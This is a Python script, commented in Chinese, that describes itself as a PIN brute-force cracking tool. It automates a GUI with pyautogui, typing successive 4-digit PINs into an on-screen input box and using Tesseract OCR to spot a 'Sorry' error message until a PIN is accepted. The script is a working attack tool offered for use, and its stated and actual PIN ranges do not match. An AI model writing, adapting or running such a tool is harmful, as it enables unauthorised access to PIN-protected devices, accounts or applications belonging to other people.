import win32api
import pyautogui
import time
from datetime import datetime
from PIL import ImageGrab
import numpy as np
from functools import lru_cache
import pytesseract
# 设置Tesseract路径
pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
def get_single_click_pos(prompt):
    """等待并获取用户实际点击的坐标，不控制鼠标"""
    print(prompt)
    prev_state = False  # 记录上一次的鼠标状态
    
    while True:
        curr_state = win32api.GetKeyState(0x01) < 0  # 检测鼠标左键状态
        
        # 检测到按下瞬间
        if curr_state and not prev_state:
            x, y = win32api.GetCursorPos()  # 获取当前鼠标位置
            print(f"位置：({x}, {y})")
            return (x, y)
            
        prev_state = curr_state
        time.sleep(0.1)  # 减少CPU使用

# 配置PyAutoGUI的安全设置
pyautogui.FAILSAFE = True
pyautogui.PAUSE = 0.2
def check_for_num(region,pin, max_retries=10, retry_delay=0.5):
    """
    检查指定区域是否出现"Sorry"文本
    region: 要检查的区域 (left, top, right, bottom)
    max_retries: 最大重试次数
    retry_delay: 每次重试之间的延迟时间(秒)
    返回：True表示检测到"Sorry"（PIN错误），False表示未检测到（PIN正确）
    """
    # 等待一段时间让界面响应
    time.sleep(0.1)

    for attempt in range(max_retries):
        # 截取指定区域的图像
        screenshot = ImageGrab.grab(region)
        
        # 使用pytesseract识别文本
        text = pytesseract.image_to_string(screenshot)
        
        # 如果识别出任何文本
        if text.strip():
            print("识别到文本：", text)
            if pin in text:
                return True
            
        # 如果没有识别出文本且还有重试机会，等待后重试
        if attempt < max_retries - 1:
            time.sleep(retry_delay)
            
    # 如果多次尝试都没有识别出文本，认为是错误的PIN
    return True
def check_for_sorry(region, max_retries=3, retry_delay=0.5):
    """
    检查指定区域是否出现"Sorry"文本
    region: 要检查的区域 (left, top, right, bottom)
    max_retries: 最大重试次数
    retry_delay: 每次重试之间的延迟时间(秒)
    返回：True表示检测到"Sorry"（PIN错误），False表示未检测到（PIN正确）
    """
    # 等待一段时间让界面响应
    time.sleep(0.1)
    
    for attempt in range(max_retries):
        # 截取指定区域的图像
        screenshot = ImageGrab.grab(region)
        
        # 使用pytesseract识别文本
        text = pytesseract.image_to_string(screenshot)
        
        # 如果识别出任何文本
        if text.strip():
            return "Sorry" in text
            
        # 如果没有识别出文本且还有重试机会，等待后重试
        if attempt < max_retries - 1:
            time.sleep(retry_delay)
            
    # 如果多次尝试都没有识别出文本，认为是错误的PIN
    return True

def generate_pins():
    """生成待尝试的PIN序列"""
    return range(8999, 7999,-1)

print("PIN码暴力破解工具")
print("说明：程序需要3次鼠标点击来设置：")
print("1. 第一次点击：PIN输入框的位置")
print("2. 第二次点击：检测区域左上角")
print("3. 第三次点击：检测区域右下角")
print("4. 之后程序将自动从0000尝试到9999")
print("5. 按Ctrl+C可随时终止程序\n")
print("准备开始...")
time.sleep(2)

# 获取各个位置
print("\n开始获取位置信息...")
input_pos = get_single_click_pos("请点击PIN输入框位置...")
time.sleep(2)
start_pos = get_single_click_pos("请点击检测区域左上角...")
time.sleep(2)
end_pos = get_single_click_pos("请点击检测区域右下角...")
time.sleep(2)
start1_pos = get_single_click_pos("请点击检测数字区域左上角...")
time.sleep(2)
end1_pos = get_single_click_pos("请点击检测数字区域右下角...")
# 计算检测区域
check_region = (
    min(start_pos[0], end_pos[0]),
    min(start_pos[1], end_pos[1]),
    max(start_pos[0], end_pos[0]),
    max(start_pos[1], end_pos[1])
)
check_region1 = (
    min(start1_pos[0], end1_pos[0]),
    min(start1_pos[1], end1_pos[1]),
    max(start1_pos[0], end1_pos[0]),
    max(start1_pos[1], end1_pos[1])
)
print("\n位置信息已设置！")
print(f"PIN输入位置：({input_pos[0]}, {input_pos[1]})")
print(f"检测区域：({check_region[0]}, {check_region[1]}) -> ({check_region[2]}, {check_region[3]})")
print(f"检测数字区域：({check_region1[0]}, {check_region1[1]}) -> ({check_region1[2]}, {check_region1[3]})\n")
start_time = time.time()
current_attempt = 0
success_pin = None
prev_image = None

try:
    # 从1000到9999依次尝试
    for pin in generate_pins():
        # 移动到输入框并点击
        pyautogui.click(input_pos)
        
        # 格式化PIN为4位数字
        pin_str = str(pin).zfill(4)
        
        # 输入PIN并回车
        pyautogui.typewrite(pin_str)
        pyautogui.press('enter')
        
        current_attempt += 1

        # 每100次尝试显示一次进度
        if current_attempt % 100 == 0:
            elapsed_time = time.time() - start_time
            speed = current_attempt / elapsed_time
            print(f"已尝试: {pin_str}, 总次数: {current_attempt}, 耗时: {elapsed_time:.2f}秒, 速度: {speed:.2f}次/秒")
        
        #识别数字区域内容
        if check_for_num(check_region1,pin_str):
            print(f"PIN {pin_str} 已确认刷新完毕")

            
        # 检查是否出现Sorry提示
        if check_for_sorry(check_region):
            print(f"PIN {pin_str} 错误，继续尝试...")
            continue
        else:
            success_pin = pin_str
            print(f"\n成功找到PIN码: {success_pin}")
            break
        


except KeyboardInterrupt:
    print("\n程序被用户中断")
except Exception as e:
    print(f"\n发生错误: {str(e)}")
finally:
    elapsed_time = time.time() - start_time
    speed = current_attempt / elapsed_time
    print(f"\n程序结束")
    print(f"共尝试 {current_attempt} 次")
    print(f"总耗时 {elapsed_time:.2f} 秒")
    print(f"平均速度: {speed:.2f} 次/秒")
    if success_pin:
        print(f"找到的PIN码是: {success_pin}")